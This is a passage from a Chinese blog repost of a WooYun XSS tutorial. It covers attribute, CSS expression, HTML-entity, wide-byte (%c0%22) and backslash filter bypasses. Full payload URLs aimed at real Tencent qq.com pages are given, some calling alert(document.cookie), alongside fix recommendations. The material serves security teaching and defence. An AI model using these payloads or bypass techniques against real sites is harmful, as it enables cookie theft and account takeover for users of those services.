<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;document.domain&#x3D;&#39;soso.com&#39;;_ret&#x3D;&#123;&quot;_res&quot;:2&#125;;try&#123;parent.eval(&#39;alert(1)&#39;);void(_ret);&#125;catch(err)&#123; eval(&#39;alert(1)&#39;);void(_ret);&#125;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>这种输出在 JS 代码里的情况十分常见，但是呢？不幸的是，像这样没过滤的情况，却不是很常见。例如： <code>var a=&quot;[输出]&quot;; //</code> 通常程序员会把 “ 过滤掉， 这样的话，一般来说，我们就很难构造。</li>
</ol>
<p>但是，这并不是说，就一定是不能利用，后面我们会拿腾讯一些【比较有意思】的例子，来进一步说到 这个【输出在 js 里】的情况的～</p>
<h2 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h2><p>这类 XSS 的模型通常是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;...[输出]...&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style&gt;...[输出]...&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>解决方案：</p>
<ol>
<li><p>过滤 `` 组合</p>
</li>
<li><p>针对输出在不同的场景，进行合适的过滤。</p>
</li>
</ol>
<h1 id="3-输出在-HTML-属性里的情况"><a href="#3-输出在-HTML-属性里的情况" class="headerlink" title="3. 输出在 HTML 属性里的情况"></a>3. 输出在 HTML 属性里的情况</h1><blockquote>
<p>来源：<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-015963">3. 输出在 HTML 属性里的情况</a></p>
</blockquote>
<h2 id="简要描述-2"><a href="#简要描述-2" class="headerlink" title="简要描述"></a>简要描述</h2><p>和前面的不一样的时，有时候，输出会出现在 HTML 标签的属性之中。</p>
<p>例如： <code>、</code> ，再比如 `` .. 这个时候怎么办呢？</p>
<h2 id="详细说明-2"><a href="#详细说明-2" class="headerlink" title="详细说明"></a>详细说明</h2><ol>
<li><p>大网站一般不是吃素的。前面讲到的基本情况，一般都很少遇到了。</p>
</li>
<li><p>这个时候我们可以把目光发展一下，找一找在【输出】出现在 HTML 属性里的情况。</p>
</li>
<li><p>最为典型的一种情况，是下面这样的。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx.com&#x2F;search.php?word&#x3D;乌云欢迎您</span><br></pre></td></tr></table></figure>
<p>HTML 代码里则是下面这样情况的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. 关键词：&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;乌云欢迎您&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>如果这里的 word 没过滤双引号。就会有以下的情况发生。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx.com&#x2F;search.php?word&#x3D;乌云欢迎您&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure>
<p>对应的源代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;乌云欢迎您&quot; onclick&#x3D;&quot;alert(1)&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>解析：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_008.jpg" alt="image"></p>
<p>那么当用户点击这个文本框时，就会触发 <code>alert(1)</code> 。</p>
<ol start="4">
<li>当然理想是美好的，现实总是残酷的，我水平有限，并没有在腾讯找到这样的例子。</li>
</ol>
<p>因为绝大部分这样的情况， 腾讯都会做出相应的过滤。 过滤方法也挺简单，将 <code>&quot;</code> 过滤为 <code>&quot;</code> 就行。 过滤后的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;乌云欢迎您&quot; onclick&#x3D;&quot;alert(1)&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li><p>一般来说，上面的情况，过滤了 <code>&quot;</code> ，可以说是高枕无忧了，但是事实并非如此。某些情况下。我们依然可以继续 XSS。下面以腾讯为例。</p>
</li>
<li><p>首先看第一种场景。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;follow.v.t.qq.com&#x2F;index.php?c&#x3D;follow&amp;a&#x3D;index&amp;appkey&#x3D;801004516&amp;bg&#x3D;我是一个兵,爱国爱人民&amp;hsize&#x3D;80&amp;name&#x3D;Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhiche n001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</span><br></pre></td></tr></table></figure>
<p>这里的 bg 参数过滤了【几乎】所有的东西。但是它输出在了<body style="[这里]"></body></p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_009.jpg" alt="image"></p>
<p>更重要的是，这里没有过滤 <code>\</code> ，反斜线， 而 css 里，允许使用转义字符, <code>\ + ascii</code> 16 进制形式。这样一来，我们就可以构造利用语句啦。</p>
<p>这里过滤了 expression, 我们也可以轻松的用 <code>expr\65ssion</code> 绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;follow.v.t.qq.com&#x2F;index.php?c&#x3D;follow&amp;a&#x3D;index&amp;appkey&#x3D;801004516&amp;bg&#x3D;;w:expr\65ssion\28%20eval\28\27\69\66\28\21\7 7\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2 e\78\3d\31\7d\27\29\29&amp;hsize&#x3D;80&amp;name&#x3D;Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qin gfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipeng tx</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_010.jpg" alt="image"></p>
<p>这种情况，遗憾之处在于，基于 css expression 的 XSS 已经进入暮年了，只有在 IE6，7 下方能触发，受众面小。这里只是作为一个案例来讲讲。</p>
<p>Tips: 至于这里的转义是如何写的：步骤如下：</p>
<p>例如 e 的 ascii 16 进制是 65, 我们就写为 <code>\65 expression -&gt; expr\65ssion</code>。</p>
<p>本例缺陷点代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style&#x3D;&quot;overflow:auto;background-color:#我是一个兵，爱国爱人民;&quot;&gt;</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>再来看下一个在属性里的案例。这个例子也是比较常见的。比如：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML 标签 onXXXX&#x3D;&quot;...[输出在这里]..&quot;&gt; </span><br><span class="line">&lt;a href&#x3D;&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>的例子。 正好，在腾讯的这个例子中，以上 2 个情况一起出现了。 我们以其中一种进行讲解。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;stock.finance.qq.com&#x2F;report&#x2F;search.php?searchtype_yjbg&#x3D;yjjg&amp;searchvalue_yjbg&#x3D;aaaaaaaaaa</span><br></pre></td></tr></table></figure>
<p>看输出，如下，aaaaaaaa 出现在了 2 个点。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_011.jpg" alt="image"></p>
<p>常规来说，因为 <code>onxxxx=&quot;[输出]&quot;</code> 和 <code>href=&quot;javascript:[输出]&quot;</code> 与 <code>[输出]</code> 没有太大区别。因为[输出]所在的地方，都是 javascript 脚本。</p>
<p>但是<code>[输出]</code> 如果被过滤，往往没有太好的办法。 而上面这 2 种情况，则有一个很好的办法绕过过滤。</p>
<p>Tips:</p>
<p>在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>是等效的</p>
<p>换言之，只要上面的情况，没有过滤 <code>&amp;</code>，<code>#</code> 等符号，我们就可以写入任意字符。 看看缺陷点的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;pagenum&quot; class&#x3D;&quot;inputstyle0814&quot; onkeydown&#x3D;&quot;if ((event.keyCode&#x3D;&#x3D;13) &amp;&amp; (this.value!&#x3D;&#39;&#39;)) location.href&#x3D;&#39;http:&#x2F;&#x2F;stock.finance.qq.com&#x2F;report&#x2F;search.php?offset&#x3D;&#39;+this.value+&#39;&amp;searchtype_yjbg&#x3D;yjjg&amp;searchvalue_y jbg&#x3D;aaaaaaaaaa&#39;&quot;&#x2F;&gt;&lt;&#x2F;li&gt;</span><br></pre></td></tr></table></figure>
<p>JS 部分我们可以做以下构造,由于’被过滤，我们可以将’写为&amp;#27；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&#39;........&amp;searchvalue_yjbg&#x3D;aaaaaa&#39;</span><br><span class="line">location.href&#x3D;&#39;........&amp;searchvalue_yjbg&#x3D;aaaaaa&#39;+alert(1)+&#39;&#39; location.href&#x3D;&#39;........&amp;searchvalue_yjbg&#x3D;aaaaaa&amp;#x27;+alert(1)+&amp;#x27;&#39;</span><br></pre></td></tr></table></figure>
<p>步骤如下：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_012.jpg" alt="image"></p>
<p>接着我们把代码转换为 url 的编码。 <code>&amp; -&gt; %26</code>, <code># -&gt; %23</code> 最后利用代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;stock.finance.qq.com&#x2F;report&#x2F;search.php?searchtype_yjbg&#x3D;yjjg&amp;searchvalue_yjbg&#x3D;aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27;</span><br></pre></td></tr></table></figure>
<p>用户点击页面[GO]按钮触发。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_013.jpg" alt="image"></p>
<p>缺陷页面的 <code>[</code>]() 触发点的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;div class&#x3D;&quot;yebg&quot;&gt;&lt;a href&#x3D;&quot;javascript:location&#x3D;&#39;http:&#x2F;&#x2F;stock.finance.qq.com&#x2F;report&#x2F;search.php?offset&#x3D;&#39;+document.getElementById(&#39;pagenum&#39;). value+&#39;&amp;searchtype_yjbg&#x3D;yjjg&amp;searchvalue_yjbg&#x3D;aaaaaaaaaa&#39;&quot;&gt;GO&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&lt;&#x2F;li&gt;</span><br></pre></td></tr></table></figure>
<h2 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h2><ol>
<li><p>对于输出在 HTML 属性中的情况，需要特殊情况特殊对待，该过滤<code>\</code>的时候，请过滤<code>\</code>, 该过滤<code>&amp;</code>的情况，则过滤掉<code>&amp;</code></p>
</li>
<li><p>碰到有某些修复的人用正则去判断， <code>&amp;#xNNN..</code>, 而实际上 <code>&amp;#x0NN;</code> <code>&amp;#x00NN</code>, （后面自己慢慢试。。） 都是可以的。 或者是 <code>&amp;#10</code> 进制; 以及一些特殊的 HTML 实体，如 <code>&quot;</code> 等，都要注意到，好麻烦， 最好的办法，还是 <code>&amp;</code>过滤为 <code>&amp;amp;</code>）</p>
</li>
</ol>
<h2 id="个人备注"><a href="#个人备注" class="headerlink" title="个人备注"></a>个人备注</h2><p>​    基于CSS expression的XSS基本碰不到了。之前\65可能直接表示字母e，但是现在要使用\x65，这是需要注意的地方。</p>
<h1 id="4-宽字节复仇记-QQ-邮箱基本通用"><a href="#4-宽字节复仇记-QQ-邮箱基本通用" class="headerlink" title="4. 宽字节复仇记 [QQ 邮箱基本通用]"></a>4. 宽字节复仇记 [QQ 邮箱基本通用]</h1><blockquote>
<p>来源：[4. 宽字节复仇记 <a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-015969">QQ 邮箱基本通用]</a></p>
</blockquote>
<h2 id="简要描述-3"><a href="#简要描述-3" class="headerlink" title="简要描述"></a>简要描述</h2><p>前面教程第 2 节，说到了输出在<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况。也说到了后面会再继续一些有意思的例子。</p>
<p>实际上，我们碰到的往往不是那么好。很多情况下，程序员都是会过滤的。</p>
<p>那么我们怎么办呢？ “因地制宜，因材施教。” 根据漏洞的实际情况，我们可以各种绕过。 不知道这里乱用成语没啊。 惶恐不安中。</p>
<p>这里先看看第一种方法，宽字节绕过。</p>
<h2 id="详细说明-3"><a href="#详细说明-3" class="headerlink" title="详细说明"></a>详细说明</h2><ol>
<li><p>有一个比较经典的 SQL 注入，是宽字节注入。玩渗透的可能对这个都比较清楚。</p>
</li>
<li><p>有时候，宽字节确实可以带来奇效～～下面我们看腾讯的一个例子。</p>
</li>
<li><p>例子如下：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;open.mail.qq.com&#x2F;cgi-bin&#x2F;qm_help_mailme?sid&#x3D;,2,zh_CN&amp;t&#x3D;%22;alert(1);&#x2F;&#x2F;aaaaaa</span><br></pre></td></tr></table></figure>
<p>我们尝试注入 “ 来闭合前面的双引号，但是很悲剧的是，双引号被过滤了。。 如下图：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_014.jpg" alt="image"></p>
<p>看到这种情况，一般人估计会放弃了吧，至少说明程序员注意到了这里，并且过滤了。</p>
<p>然后我们可以看到编码是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;gb18030&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>gbxxxx 系列的编码，那么我们尝试一下宽字节呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;open.mail.qq.com&#x2F;cgi-bin&#x2F;qm_help_mailme?sid&#x3D;,2,zh_CN&amp;t&#x3D;%c0%22;alert(1);&#x2F;&#x2F;aaaaaa</span><br></pre></td></tr></table></figure>
<p>看看效果：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_015.jpg" alt="image"></p>
<p>弹个窗：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_016.jpg" alt="image"></p>
<p>至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。并不是因为<code>%22</code> 变 成了 <code>%5c%22</code>,而 <code>%c0</code> 吃掉了后面的<code>%5c</code>。 而后面这种情况，在腾讯的相关站点暂时没有发现实际案例。 如果有，欢迎大家分享。</p>
<h2 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h2><p>不一一列举了。有这个参数的基本都有问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;msgopt.mail.qq.com&#x2F;cgi-bin&#x2F;readtemplate?sid&#x3D;ktqO7DjMQcJuAABQ&amp;folderid&#x3D;9&amp;pagehttp:&#x2F;&#x2F;msgopt.mail.qq.com&#x2F;cgi-bin&#x2F;readtemplate?sid&#x3D;ktqO7DjMQcJuAABQ&amp;folderid&#x3D;9&amp;page&#x3D;0&amp;t&#x3D;aaaa%c0%22;alert(1);&#x2F;&#x2F;bbbbx&amp;loc&#x3D;folderlist,,,9</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;r.mail.qq.com&#x2F;cgi-bin&#x2F;reader_main?sid&#x3D;ktqO7DjMQcJuAABQ&amp;t&#x3D;aaaa%c0&quot;bbbbx&amp;source&#x3D;folderlist</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;exmail.qq.com&#x2F;cgi-bin&#x2F;bizmail?sid&#x3D;N7fzoGwkeI8ydyRo,7&amp;action&#x3D;show_user&amp;alias&#x3D;zhaopin@ucanlove.com&amp;t&#x3D;%c0&quot;ccccbbbbx&amp;s&#x3D;showaccount</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;exmail.qq.com&#x2F;cgi-bin&#x2F;loginpage?errtype&#x3D;3&amp;verify&#x3D;true&amp;clientuin&#x3D;info&amp;t&#x3D;dm_loginpage&amp;d&#x3D;fartech.cn&amp;s&#x3D;&amp;alias&#x3D;&amp;regalias&#x3D;&amp;delegate_url&#x3D;&amp;title&#x3D;&amp;url&#x3D;%2Fcgi-bin%2Flogin%3F&amp;org_fun&#x3D;&amp;aliastype&#x3D;other&amp;ss&#x3D;&amp;from&#x3D;&amp;autologin&#x3D;n&amp;param&#x3D;&amp;sp&#x3D;&amp;r&#x3D;b63f6de34c24eeb8a3099ab4bbfc1b8d&amp;ppp&#x3D;&amp;secpp&#x3D;%c0%22onmousebbbb&#x3D;alert(document.cookie);&#x2F;&#x2F;&amp;dmtype&#x3D;bizmail</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;open.mail.qq.com&#x2F;cgi-bin&#x2F;qm_help_mailme?sid&#x3D;,2,zh_CN&amp;t&#x3D;%c0&quot;ccccbbbbx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;open.mail.qq.com&#x2F;cgi-bin&#x2F;communication?sid&#x3D;,2,zh_CN&amp;t&#x3D;%c0&quot;ccccbbbbx&amp;action&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;open.mail.qq.com&#x2F;cgi-bin&#x2F;feedback_loop?sid&#x3D;,2,zh_CN&amp;check&#x3D;false&amp;t&#x3D;%c0&quot;ccccbbbbx&amp;action&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;exmail.qq.com&#x2F;cgi-bin&#x2F;viewdocument?sid&#x3D;H6Mg9z5XNfqsfhdH,7&amp;filename&#x3D;%CC%EC%BD%F2%BB%C6%BD%F0%C8%D5%D6%DC%C6%C00917.doc&amp;mailid&#x3D;ZL2017-RfnEvncOeLfhJ04eTPrSU29&amp;retry&#x3D;true&amp;t&#x3D;%c0%22ccccbbbbx&amp;ef&#x3D;qfunc</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;reader.qq.com&#x2F;cgi-bin&#x2F;rss_main?sid&#x3D;MTOtOYwpx56MMzN9&amp;t&#x3D;aaaa%c0%22;alert(document.cookie);&#x2F;&#x2F;bbbbx&amp;s&#x3D;mag&amp;r&#x3D;222&amp;init&#x3D;true&amp;update&#x3D;1</span><br></pre></td></tr></table></figure>
<h2 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h2><p>修复相关过滤机制。</p>
<h2 id="个人备注-1"><a href="#个人备注-1" class="headerlink" title="个人备注"></a>个人备注</h2><p>1、宽字节注入，首先确定该网站知否支持gb其他系列编码。</p>
<p>2、%c0%22其中%22代表双引号，c0是随意添加的（ascii码大于128位时，自动拼接后面的两位），不是真的要构造一个汉字。所以说c0可以吃掉5c</p>
<h1 id="5-反斜线复仇记"><a href="#5-反斜线复仇记" class="headerlink" title="5. 反斜线复仇记"></a>5. 反斜线复仇记</h1><blockquote>
<p>来源：<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-015979">5. 反斜线复仇记</a></p>
</blockquote>
<h2 id="简要描述-4"><a href="#简要描述-4" class="headerlink" title="简要描述"></a>简要描述</h2><p>还是在<code>&lt;script&gt;</code>之间的场景，某些情况下，我们仅仅需要的只是一个反斜线，就可以绕过过滤了。</p>
<h2 id="详细说明-4"><a href="#详细说明-4" class="headerlink" title="详细说明"></a>详细说明</h2><ol>
<li>有以下实例点。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mail.qq.com&#x2F;cgi-bin&#x2F;login?vt&#x3D;passport&amp;ss&#x3D;aaa&amp;from&#x3D;bbb&amp;delegate_url&#x3D;%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi- bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526cl ickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</span><br></pre></td></tr></table></figure>
<p>对应的输出，如下图所示：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_017.jpg" alt="image"></p>
<p>经过测试，我们可以看到，双引号是用不了（被过滤为<code>&amp;quot;</code>)， 但是 反斜线还可以使用。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_018.jpg" alt="image"></p>
<p>那么这里是否可以成功的 XSS 呢？ 我们把缺陷代码部分提取出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;getTop().location.href&#x3D;&quot;&#x2F;cgi-bin&#x2F;loginpage?autologin&#x3D;n&amp;errtype&#x3D;1&amp;verify&#x3D;&amp;clientuin&#x3D;&quot;+&quot;&amp;t&#x3D;&quot;+&quot;&amp;alias&#x3D;&quot;+&quot;&amp;regali as&#x3D;&quot;+&quot;&amp;delegate_url&#x3D;%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting1 0%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title&#x3D;&quot;+&quot;&amp;url&#x3D;%2 Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Din dex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;+&quot;&amp;org_fun&#x3D;&quot;+&quot;&amp;aliastype&#x3D;&quot;+&quot;&amp;ss&#x3D;aaa&quot;+&quot;&amp;from&#x3D;bbb&quot;+&quot;&amp;param&#x3D;&quot;+&quot;&amp;sp&#x3D;6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r&#x3D;3ec785174fff5206 ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp&#x3D;&quot;+&quot;&amp;secpp&#x3D;&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>可以看到有缺陷的部分是</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa&quot;+&quot;&amp;from&#x3D;bbb&quot;+&quot;&amp;param&#x3D;&quot;;&#x2F;&#x2F;后面省略。</span><br></pre></td></tr></table></figure>
<p>我们可以控制的是 aaaa ，又不能用<code>&quot;</code>，怎么办呢？ 因为我们可以使用 <code>\</code>，那么我们可以杀掉 aaaa 后面的 双引号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa\&quot;+&quot;&amp;from&#x3D;bbb&quot;+&quot;&amp;param&#x3D;&quot;;</span><br></pre></td></tr></table></figure>
<p>可以看到代码的结果因为一个反斜线发生了变化，如下图：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_019.jpg" alt="image"></p>
<p>为了保证 bbb 后面的语法正确性，我们把 bbb 改为一个数字，把 bbb 后面加上 <code>//</code> 来注释掉后面的部分。变成以下形式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa\&quot;+&quot;&amp;from&#x3D;1&#x2F;&#x2F;&quot;+&quot;&amp;param&#x3D;&quot;;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>看起来不错哦，但是会出来一些问题，<code>&quot;字符串&quot;&amp;from=1</code>，这样是错误的，因为&amp;符号的优先级高， <code>(&quot;字符串&quot;&amp;from)=1</code> 是无法进行 这种赋值操作的。这样一来还是不行。别着急。我们可以稍微改动一下。变为以下形式。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa\&quot;+&quot;&amp;from&#x3D;&#x3D;1&#x2F;&#x2F;&quot;+&quot;&amp;param&#x3D;&quot;;</span><br></pre></td></tr></table></figure>
<p>由于==的优先级比 <code>&amp;</code> 高，所以语句相当于 <code>(&quot;字符串&quot;)&amp;(from==1)</code></p>
<ol start="4">
<li><p>更顺眼了，但是还是会悲剧啊。由于 from 未定义，直接和 1 进行相等判断的话，会报错，错误是：“from”未定义。。。怎么办呢？</p>
</li>
<li><p>别紧张，javascript 里有一个特性。 如下：</p>
</li>
</ol>
